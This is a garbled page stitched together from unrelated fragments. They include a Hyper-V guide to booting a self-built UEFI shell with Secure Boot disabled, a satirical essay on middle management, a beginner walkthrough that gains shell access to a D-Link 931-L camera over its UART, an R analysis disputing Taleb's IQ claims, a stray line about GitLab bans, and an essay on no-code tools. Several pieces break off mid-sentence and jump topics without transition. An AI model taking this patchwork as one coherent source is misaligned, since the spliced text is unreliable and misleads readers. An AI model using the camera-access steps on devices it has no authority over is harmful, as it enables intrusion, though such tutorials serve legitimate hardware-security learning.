<p>After doing that, you should find the resulting shell.efi file in C:\EDK2\Build\Shell\DEBUG_VS2017\X64\ShellPkg\Application\Shell\Shell\DEBUG.&nbsp; Now, let’s try to use it…</p>



<h3>Chapter 3: Booting to the EFI shell </h3>



<p>Let’s start off with something really simple:&nbsp; A brand-new VM with no operating system on it.&nbsp; Based on the previous discussions, all we should need to do is create a FAT32 disk, place the EFI file in the right place, and then boot.&nbsp; So let’s try it.&nbsp; Here are the steps:</p>



<ul><li>Create a new VM in Hyper-V (4GB RAM, a small expanding VHDX, gen 2, two processors – typical stuff).&nbsp; Don’t start it yet.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-3.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-3.png" alt="image"></a></figure>



<ul><li>Find the VHDX file in File Explorer and double-click it to mount it.&nbsp; You’ll get a message like this:</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-4.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-4.png" alt="image"></a></figure>



<ul><li>Do as it says: Open Disk Management, initialize the disk, and then create a small FAT32 partition.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-5.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-5.png" alt="image"></a></figure>



<ul><li>It should look like this (the E: drive):</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-6.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-6.png" alt="image"></a></figure>



<ul><li>Navigate to the drive (E: from my example) in File Explorer.&nbsp; Create an E:\EFI\BOOT folder structure, then copy the shell.efi file into it, renaming it to bootx64.efi (remember that from above?).</li></ul>



<blockquote><p> Directory of e:\EFI\BOOT</p><p>09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<br>
09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ..<br>
09/01/2019&nbsp; 12:31 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bootx64.efi<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bytes</p></blockquote>



<p>Right-click on the drive (e.g. E:\) in File Explorer and eject it (which unmounts it).</p>



<p>Now you can start the VM – and see it fail with an error like this:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-7.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-7.png" alt="image"></a></figure>



<p>That’s actually a good sign: The UEFI firmware attempted to load the EFI shell (shell.efi renamed to bootx64.efi), but it failed.&nbsp; Any guesses as to why from the error message on the screen, “unsigned image’s hash is not allowed”?&nbsp; Simple, it’s a Secure Boot error.&nbsp; The EFI executable isn’t signed by Microsoft – actually it isn’t signed at all.&nbsp; So to get it to run, we need to turn off Secure Boot.&nbsp; Turn off the VM and change the setting:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-8.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-8.png" alt="image"></a></figure>



<p>Apply the change, then start the VM again.&nbsp; Now we see something much better:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-9.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-9.png" alt="image"></a></figure>



<p>As you can see in that output, the device is running UEFI shell 2.2 (the most recent version of the spec), UEFI 2.7 (pretty recent, there is a 2.8 version now), and Microsoft is the vendor (as expected in Hyper-V).&nbsp; If you look at a directory of the FS0: volume:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-10.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-10.png" alt="image"></a></figure>



<p>You can see that it is the FAT32 volume that we prepared before, with the renamed shell.efi loaded by the virtual machine automatically.</p>



<p>See page 92 of <a href="https://uefi.org/sites/default/files/resources/UEFI_Shell_2_2.pdf" target="_blank">the UEFI Shell 2.2 spec</a> for all the commands that are accepted.&nbsp; The one that I am most interested in is “dmpstore” because it will dump out all of the UEFI variables.&nbsp; You can specify that you want all variables (-all), and that you want to page through them on the screen (-b, useful to see the names on the screen).&nbsp; Here’s an example from …</p></section></article></div>

Unbeknownst to you, Genghis, the company CEO, just had dinner with other industry leaders and became excited about this new thing called Beezlyboo. Genghis mentions his excitement at Thursday’s executive council meeting, with the company’s top layer of middle management listening in.</p><p>Mandukhai, the middle manager two layers above you, was present. She conveys the takeaways in her regular Friday morning coffee catchup with the managers that report to her, including the Foobar team lead, your boss, Subotai.</p><p>Fighting for relevance after a bumpy year, Subotai grows convinced that working on this Beezlyboo thing might be his ticket back into Mandukhai's good graces.</p><p>You enter the office on Monday morning, unsheathe your sword, and balance it carefully on top of your monitor before sitting down and getting to work. <i>Little do you know that two weeks from now, half your time will be spent on this new thing called Beezlyboo.</i></p><div><h3>How Middle Management Emerges</h3><p>This is an unfortunately common description of how decisions are made in many of today’s <del>Khanates</del> companies. Why is that? Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage. We assume that reporting edges correspond to lines of communication and that members of a team are fully connected in complete graphs.</p></div></d-figure></figure><p>The benefits are clear. When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai. By concentrating ownership of Foobar in Subotai’s hands, his team is shielded from unnecessary communication, allowing them to focus on their work.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>To illustrate: <span><span><span><math><semantics><mrow><msub><mi>K</mi><mrow><mn>5</mn><mn>0</mn><mn>0</mn><mn>0</mn></mrow></msub><mo>=</mo><mn>1</mn><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mn>9</mn><mn>7</mn><mo separator="true">,</mo><mn>5</mn><mn>0</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">K_{5000} = 12,497,500</annotation></semantics></math></span></span></span>, but introducing 556 managers<a href="#2po"><sup id="2pr">2</sup></a> each with <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>=</mo><mn>1</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">m(i) = 10</annotation></semantics></math></span></span></span> reports gives <span><span><span><math><semantics><mrow><msub><mi>M</mi><mrow><mn>5</mn><mn>5</mn><mn>6</mn></mrow></msub><mo>=</mo><mn>3</mn><mn>0</mn><mo separator="true">,</mo><mn>5</mn><mn>8</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">M_{556} = 30,580</annotation></semantics></math></span></span></span>.

While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China.

	</p>
      <p>I’ve (finally) posted the follow up to my last video! In this one we’re dipping a toe into hardware reversing by finding a UART (serial port) and using it to get shell access on a 931-L. If you’ve never done anything with hardware this is a great place to start, or at least get some initial exposure to the concept.</p>

<p>For those who want to try this on there own I’ve posted a list of tools/equipment, a set of quick reference steps from the walkthrough, and finally some troubleshooting ideas in case you hit any snags. The camera is cheap and it’s about as soft a target as they come, so hopefully this is a fun way to cut your teeth.</p>

<h3 id="tools-and-equipment">Tools and Equipment</h3>

<p>Here’s a breakdown of what we used in the video, roughly in the order it appeared. You don’t need specific makes/models of anything except the 931-L; whatever equivalent tools you have will probably do the trick.</p>

<ul>
  <li>D-Link 931-L Camera</li>
  <li>Shim made from an aluminum can</li>
  <li>1mm guitar pick</li>
  <li>Phillips head driver (PH0)</li>
  <li>Benchtop Vise (Panavise 201)</li>
  <li>Switched outlet</li>
  <li>Multimeter (Innova 3320)</li>
  <li>3.3V FTDI (Sparkfun DEV-09873)</li>
  <li>Grabber Probes w/ jumper wires attached</li>
  <li>Header Pins</li>
  <li>USB cable</li>
  <li>Kali Linux (VM running over Mac)</li>
</ul>



<h3 id="walkthrough-quick-reference">Walkthrough: Quick Reference</h3>
<p>
<strong>Finding Internal Photos in FCC Filings</strong></p>

<p>We needed to know if the 931-L had the kind of attack surface we were looking for (specifically a UART). To get a peek at the inside of the camera before buying it we looked at the internal photos included in the camera’s FCC filing. You can find the photos shown in the video by opening the <a href="https://www.fcc.gov/oet/ea/fccid">FCC’s search tool</a> and entering 931-L’s FCC ID: KA2CS931LA1.</p>

<p>Quick Tip: If you want to find the filing for a device but don’t know the FCC ID, try <a href="https://fccid.io/search.php">FCCID.io’s free search tool</a>. It’s a lot faster/easier than trying to pry it out of the FCC’s search tool.</p>

<p><br>
<strong>Cracking the Case and Prepping the Board</strong></p>

<p>The camera’s case is held together with ~8 plastic clips, which we removed using a shim cut from an aluminum can and a 1mm guitar pick (there are great kits available for this kind of thing but I wouldn’t recommend investing in one for your first project).</p>

<p>We put the board into a benchtop vise to hold it steady, then plugged the power supply into a switched outlet. This allowed us to power the device up and down easily, without fumbling around to pull the cable out. If you don’t have a switched outlet, a surge protector or a lamp cord switch will do the trick just fine.</p>

<p>A bit out of order here, but one last board prep item: we also placed a row of 4 header pins into the row of plated through holes (TPHs). We didn’t solder it, but we got really lucky there. If you’re doing this on your own I’d recommend soldering them in, if only to remove a possible point of failure. It’s also worth noting that the pin size and pin pitch (distance between pins) is smaller than the more commonly sized connectors out there. If you run into problems, consider just soldering jumper wires to the PTHs themselves (to save time remember you don’t actually need the one marked V!)</p>

<p><strong>Finding the UART</strong></p>

<p>The JST connectors shown in the FCC photos weren’t on our camera, but the four plated through holes (PTHs) that the JST connector used where still present. As shown below the reference designator on the board was J2, and PTHs themselves were labeled “G”, “R”, “T”, and “V”.</p>

<p><img src="http://1585security.com/img/blog/2019/UART-on-board.jpg" alt=""></p>

<p><strong>Testing the UART</strong></p>

<p>It seemed likely that the labels on those PTHs stood for Ground, Receive, Transmit, and some kind of voltage, but we ran a hasty survey to be sure. We began by checking for Ground on “G” by using the multimeter to run a continuity test between “G” and a spot on the board where the ground plane was exposed.  With ground confirmed we switched the multimeter to measure DC voltage, powered on the device and checked the voltage levels on “R”, “T”, and “V”. Observations and conclusions from the survey are summarized below.</p>

<table>
	<colgroup>
		<col width="15%">
		<col width="50%">
		<col width="35%">
	</colgroup>
	<thead>
		<tr>
			<th>Label</th>
			<th>Observations</th>
			<th>Conclusions</th>
		</tr>
	</thead>

	<tbody>
		<tr>
			<td><strong>G</strong></td>
			<td>Continuity with device’s ground plane.</td>
			<td>G = Ground</td>
		</tr>

		<tr>
			<td><strong>R</strong></td>
			<td>Pulled down when device running.</td>
			<td>R = Receive (Serial In)</td>
		</tr>

		<tr>
			<td><strong>T</strong></td>
			<td>Jitters ~3.3V when the device is booting</td>
			<td>T = Transmit (Serial Out)</td>
		</tr>
		
		<tr>
			<td><strong>V</strong></td>
			<td>Pulled up to 3.31, stays there.</td>
			<td>V = Voltage (supply)</td>
		</tr>

	</tbody>
</table>

<em>Quick Tip:</em> If you’ve never used a multimeter or are just a bit rusty, there are loads of tutorials out there. SparkFun’s <a href="https://learn.sparkfun.com/tutorials/how-to-use-a-multimeter/">How to Use a Multimeter</a> is solid and includes walkthroughs of the continuity and voltage measurements we did in the video.
</p><p>
<strong>Wiring up the FTDI</strong></p></div>

<p>With the camera powered off, we connected the FTDI to the camera board using jumper wires and grabber probes as shown below. Note that the “V” was not connected.</p>

<p><img src="http://1585security.com/img/blog/2019/ftdi-wired.jpg" alt=""></p>

<div><p>Once the FTDI was wired up, we connected it to the laptop via USB.
</p><p>
<strong>Verifying the USB and opening a serial connection</strong></p></div>

<p>With the camera powered off, we verified that the Kali VM recognized the FTDI with <code>lsusb</code>. We then found the TTY for it by running <code>ls /dev/|grep USB</code>. Since the FTDI was the only USB device attached to the VM, it was the only game in town (USB0).</p>

<p><img src="http://1585security.com/img/blog/2019/verifying-USB.jpg" alt=""></p>

<p>We now knew where to open the serial connection using the <code>screen</code> utility, but we didn’t know which baud rate to specify. While we could have calculated it or used a tool that could calculate it for us, we opted to try guessing it from a short list of common baud rates.</p>

<p>Our first guess was 115200. We tested it by opening a serial connection with <code>screen /dev/ttyUSB0 115200</code>, and then powering up the camera. The result was mangled output, so this was a bad guess. We powered off the camera, then exited <code>screen</code> with a <em>ctrl+A+D</em></p>

<p><img src="http://1585security.com/img/blog/2019/mangled-serial.jpg" alt=""></p>

<p>Next we tried another common baud rate: 57600. Again, we used screen to open a serial connection (<code>screen /dev/ttyUSB0 57600</code>), then powered on the camera. This time it worked! We could see the bootloader, which appeared to be unlocked.</p>

<p><img src="http://1585security.com/img/blog/2019/boot-loader-menu.jpg" alt=""></p>

<p>The boot process took ~3 minutes, during which a lot of information was written to the screen. We kept a copy of everything for an offline review (we used the scrollback buffer, but screen does have a native logging feature). After the console messages from the boot process calmed down we verified the shell with a few basic commands (<code>pwd</code>, <code>ls</code>, and <code>ps -ef</code>).</p>

<p>That was it for this one. Next time we’ll poke around the shell a bit and see what we can do.
<br></p>
<h3 id="troubleshooting">Troubleshooting</h3>

<p>A few common problems and things to try if you run into them:</p>

<p><strong>Your machine doesn’t recognize the FTDI</strong>. You’ve made sure the FTDI is connected via the USB cable, but you don’t see it in a <code>lsusb</code>.</p>

<ul>
  <li>If you’re running a VM, make sure the USB is connected to that, rather than your host machine.</li>
  <li>Depending on your OS and FTDI it could be a driver issue, check the docs for your stuff.</li>
  <li>If all else fails, disconnect it all, reboot, and reconnect it.</li>
</ul>

<p><strong>Errors when opening a serial connection</strong>. You’re getting error messages with stuff like <em>Device Busy</em> or <em>Cannot exec ‘/dev/ttyUSB0’: No such file or directory</em>.</p>

<ul>
  <li>Screen is notorious for hanging onto devices if it’s not detached gracefully, which can cause <em>device busy</em> errors. Check for fouled processes with something like <code>ps -ef|grep SCREEN</code>. Prevent this kind of stuff by making sure you detach from <code>screen</code> connections with <em>ctrl+A+D</em></li>
  <li>If you’re getting <em>no such file or directory</em> errors, it could be that your machine isn’t recogizing the FTDI (see above), or just that you’re specifying the wrong device. Double check that TTY- it won’t always be ttyUSB0, particularly if you’ve got more than one USB device connected.</li>
</ul>

<p><strong>A serial connection opens but nothing happens</strong>. Sounds like your computer can talk to the FTDI (that’s good), but not beyond it.</p>
<ul>
  <li>Check your wires, make sure the connections are good, and that everything is going to the right place.</li>
  <li>See the wiring diagram above for reference…mistakes like putting R-to-R are easy to make.</li>
</ul>

<p><strong>A serial connection opens but the output is a mess</strong>.  We saw this in the video when the baud rate was wrong, so that’s an easy thing to check. But assuming that’s right:</p>
<ul>
  <li>Triple-check (srsly) your ground connection- especially if “everything was working fine last time”. A bad ground can foul up all sorts of stuff, and is often the source of connections looking janky/missing information.</li>
</ul>

<p><strong>Camera isn’t booting or is otherwise being weird</strong></p>
<ul>
  <li>Check your connections to ensure you’re not accidentally shorting anything. A bit too much solder or a bad angle on a grabber probe is usually the culprit.</li>
  <li>If you’re still having trouble after that try the factory reset process (see camera docs).</li>
  <li>It’s also possible that your board became damaged at some point, but fixing stuff like that is beyond what a beginner should try to fix.</li>
</ul>

<h3 id="introduction">Introduction</h3>
<p>In this post I look into the document by Nassim Taleb: <a href="https://medium.com/incerto/iq-is-largely-a-pseudoscientific-swindle-f131c101ba39">IQ is largely a pseudoscientific swindle</a>. Most of the document is just a rant, but he does make some quantitative claims, which is good. I investigate the veracity of these claims using real data.</p>
<p>[Edit: The quotes below were taken verbatim from Taleb’s document as it was written when this post was uploaded.]</p>

<h3 id="variance-explained-by-iq">Variance explained by IQ</h3>
<p>Claim:</p>
<blockquote>
<p>[IQ] explains at best between 2 and 13% of the performance in some tasks</p>
</blockquote>
<p>I already have prepared the <a href="https://www.ssc.wisc.edu/wlsresearch">WLS</a> data set <a href="http://jsmp.dk/files/wls_data.html">here</a>, and it has a good IQ test, so I will use that. Lets look at the regression of grades on IQ.</p>
<div data-layout="l-body">

</div>
<p>The adjusted R<sup>2</sup> is 0.356, so IQ explains ~35% of the variance of grades in this data set. Taleb defenders may say that things such as school grades don’t matter in real life. But whatever your position on this, the situation is that he made a specific claim about how much IQ explains <em>at best</em>, which was off by a large factor.</p>

<h3 id="iq-selection-vs-random-selection">IQ selection vs random selection</h3>
<p>Claim:</p>
<blockquote>
<p>Turns out IQ beats random selection in the best of applications by less than 6%</p>
</blockquote>
<p>He hasn’t specified what exactly he means by this. But I’m pretty sure he is thinking of a comparison like the one he talks about in this tweet:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/puzzle.jpg" width="300px"></p>

<p>So I will analyze something this, a stylized example with assumptions similar to these. In the real world, you will likely have other information that complicates this picture, such as education credentials; but we ignore that for now.</p>
<p>I create two normally distributed variables, with correlation 0.5, and call them IQ and performance.</p>
<div data-layout="l-body">
<details>
<summary>create variables</summary>
<pre><code>
n &lt;- 10**8

X0 &lt;- MASS::mvrnorm(
  n=n, 
  mu = c(0,0), 
  Sigma = matrix(c(1,0.5,0.5,1),
                 2,2))

df &lt;- tibble(IQ = X0[,1], 
             performance = X0[,2])

df %&gt;% summarise(
  cor = cor(IQ, performance), 
  n = n(),
  mean_IQ = mean(IQ),
  sd_IQ = sd(IQ),
  mean_performance = mean(performance),
  sd_performance = sd(performance)
  )

</table>
</div>

<p>The probability of hiring an employee with above average performance, if you hire an employee with above average IQ is:</p>
<div data-layout="l-body">
<pre><code>
above_average_iq &lt;- df %&gt;% filter(IQ &gt; 0)

nrow(above_average_iq %&gt;% filter(performance &gt; 0)) / nrow(above_average_iq)
</code></pre>
<p><em>0.667</em></p>
</div>

<p>The probability if there was 0 correlation is of course 0.5. So using IQ as a criteria beats random selection by 16.67% (as Taleb also found). This is a little more than 6%, but that is a detail. More importantly, this example is a theoretical use case where using IQ testing is not so useful. To look at something a little more realistic, let’s say a company wants to avoid people with a performance more than 2 standard deviations below the mean. (Perhaps such employees have a risk of causing large harm, which could for instance be an issue in <a href="https://quillette.com/2018/08/25/the-dangers-of-ignoring-cognitive-inequality/">the military</a>.) And we again compare admitting people at random vs only taking applicants with above average IQ.</p>
<p>If the company admits people at random, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection &lt;- 
  nrow(filter(df, performance &lt; -2)) / n

bad_performance_w_random_selection
</code></pre>
<p><em>0.0228</em></p>
</div>

<p>And if the company only takes applicants with above average IQ, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_iq_criteria &lt;- 
  nrow(filter(above_average_iq, performance &lt; -2)) / 
  nrow(above_average_iq)

bad_performance_w_iq_criteria
</code></pre>
<p><em>0.00406</em></p>
</div>

<p>This is an improvement by a factor of:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection / bad_performance_w_iq_criteria
</code></pre>
<p><em>5.6</em></p>
</div>

<p>In other words, using IQ selection criteria in this case beats random selection by more than 450%. Quite different than the claimed 6%.</p>

<h3 id="iq-and-income">IQ and income</h3>
<p>Claim:</p>
<blockquote>
<p>There is no correlation IQ/Income above 45K</p>
</blockquote>

<p>The plot looks similar to the one from the paper, but somewhat different, because I use the average income values for a period of 10 years, instead of that from a single year.</p>

<p>As in the plot used by Taleb it’s quite hard to see whats going on with all the overlying points. Reducing the transparency helps somewhat.</p>

<p>Another way to make the relationship clearer is to plot the distribution of income for seperate IQ groups. Plotting the distribution avoids the issue of the plot becoming unclear and confusing due to overlapping points.</p>
<p>The plot below again plots only people with income above $45k per year. The difference IQ makes is clear, both in the median value, and the length of the tails.</p>

<h3 id="iq-and-fat-tails">IQ and fat tails</h3>
<blockquote>
<p>[The income data] truncates the big upside, so we not even seeing the effect of fat tails</p>
</blockquote>
<p>It is correct that in the presence of fat tails the correlation is uninformational in predicting expected income. And the data from these studies does not give good information about such tails. However, it is highly possible that the effect of IQ is even more impactful in the tails, rather than less. For example, Bill Gates and Paul Allen scores 1590/1600 on their SATs, which for SATs at that time meant extremely high IQs. Since Bill Gates is also in the tail of wealth and income, this indicates that the overall impact of people in the tails is to accentuate rather than diminish the importance of IQ.</p>

<h3 id="correlation-only-for-low-iq">Correlation only for low IQ</h3>
<blockquote>
<p>IQ mostly measures extreme unintelligence</p>
</blockquote>
<p>He claims that IQ has high correlation with traits at low IQ, but that this correlation falls drastically at above median IQ, as illustrated in this figure from the post:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqcor2.png" width="300px"></p>
<p>(Edit: In case this is not clear, Taleb uses the above figure as an illustration, not as a precise empirical claim.) It’s quite easy to look into the data to see whether this actually is the case. We can use the same two data sets used above.</p>
<p>If we plot IQ vs log(income), that will tell us how large a percentage increase in income each extra IQ point gives. Then we can plot a local regression (loess) and compare that to a linear regression. If the relationship between IQ and income radically diminished at above average IQ, then we would expect the loess regression line to approach horizontal. However, this is not what we see - instead the two regression lines follow each other quite closely. It is true that the percentage increase in income per IQ point is a little higher for lower IQs, but it never stagnates.</p>

My friend is not the only one who blocked by GitLab, with a simple search on the web you can find a growing list of blocked accounts.  <br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2><strong>Introduction</strong></h2><p>I have been building web apps and native apps on two of the leading no-code tools out there for the last year. When I started, I was blown away. I could get so much done in so little time.</p><p>Being a developer, this was liberating. I had always felt that a lot of the things we developers do aren’t actually that complicated. Unfamiliar syntax and complex developer processes keep people out. 99% of the time, developers are just wiring things. So initially, it made sense. While other developers scoffed at these tools, I was churning out apps after apps in a few weeks time.</p><p>As months rolled by, my budding romance with no-code tools ebbed. I struggled to justify why we were building things using them. I was interested in this space so I did my research. I read the no-code manifesto from various sources, tried out a bunch of other tools and began putting my thoughts together. </p><p>This essay is the result of that research. Please note, when I say no-code in this article, I mean no-code app builders / website builders. I don’t have any experience with the other types of no-code tools (such as automations, integrations etc) so I won’t comment about them.</p><h2>Why no-code</h2><p>Let’s take a logistics example. In logistics, there are standardised solutions for the highways, railroads and seas. That transportation is relatively cheap because you can move a lot of things together and economies of scale kick in. </p><p>Getting things from the highways into individual homes, however, is difficult and expensive because you need one transportation medium for each consumer. This is also called as the last-mile problem.</p><p>Coming back to software, we now have standardised solutions for the “highway” problems. We have solutions for email, video conferencing, searching, entertainment and so on. These problems are faced by a large number of people and so it makes economic sense for businesses to go solve them.</p><p>Then, we have the small problems. For example, an app that one business in the world needs to solve an operational challenge. This use-case is so specialised that businesses just don’t have an incentive to solve it. Without no-code, this business will have to get this software custom built which will take a lot of time and money. This is where no-code shines. It provides simple building blocks that users can use to put together a custom solution. Goes without saying, no-code tools are only as good as their primitives - these fundamental building blocks that they allow mixing and matching.</p><blockquote><p>With no-code, you can build custom things for yourself that you can’t find an out-of-the-box solution for.</p></blockquote><h2>Landscape today</h2><p>A lot of the last-mile problems in software yesterday are now becoming railroad problems. In fact, we are finding more efficient solutions for many of the railroad problems as well. </p><p>Take Shopify for example. Does it make sense for anyone to build an e-commerce store from scratch today? Shopify provides so many features for such a low starting price that it’s just impossible for anyone building it from scratch to match it.</p><p>Until a few years ago, if you were a SAAS and you needed a decent software for organising your guides, API reference and solutions, your options were Intercom, Freshdesk and Zendesk. All of them are full-blown support platforms which you might or might not need. Today, you can create a public Notion document with all your support articles and you’re done. For free. Notion provides search out-of-the-box, supports all sorts of media types and looks great. There are a dozen other things you can do in Notion for which you previously would have paid to several different vendors.</p><p>Airtable has done something similar to operations on entities. If you want to create a form on top of an Airtable base, you can do that at the click of a button within Airtable. In fact, you can assemble entire apps within Airtable.</p><p>In the near future, we will see solutions that will introduce even better abstractions and upgrade last-mile solutions into railroads solutions and railroads solutions into their more efficient variants.</p><h2>What’s my problem</h2><p>My fundamental problem is that most no-code tools out there say that their users will not need code at all. No, I am not referring to the term “no-code”. Many in the no-code community agree that that name is a misnomer. I am referring to what these tools say on Twitter, or write on their landing pages. They say you can build <em>anything </em>without any code at all. That I think is either a <em>blatant lie </em>or a delusion.</p><p>With no-code tools, you are simply putting blocks together. If you need a different block or if you are looking for smaller blocks than the ones that the tool provides, you are stuck. </p><blockquote><p>The truth is - code is king. When you want custom flows, code will come to rescue. When you need a component that doesn’t exist, code will come to rescue. When you want to connect anything that the creators of the no-code tool didn’t envision getting connected, code will be the answer.</p></blockquote><p>Don’t confuse my argument with another argument that people throw at no-code tools - “You are using code underneath. You need developers for that code. What no-code?” </p><p>I think there is definitely value in creating a layer on top of code. My big problem is - today’s no-code tools don’t seem to admit that their primitives are not good enough. </p><p><strong>That they still don’t have a primitive that comes close to code.</strong></p><p>With the primitives that no-code has today, there is no competitive edge. Anyone can build a bunch of components, write some integrations and ship a new no-code tool. Please don’t say these products have communities. When a user is stuck, they are looking for answers and no amount of community support can unblock them.</p><p>Worse still, SAAS software such as Notion and Airtable can eventually provide most of the functionalities that no-code tools provide, out-of-the-box. They have access to the same primitives. It’s already happening. There are SAAS today that are providing white-label apps to restaurants, convenience stores, e-commerce stores etc. 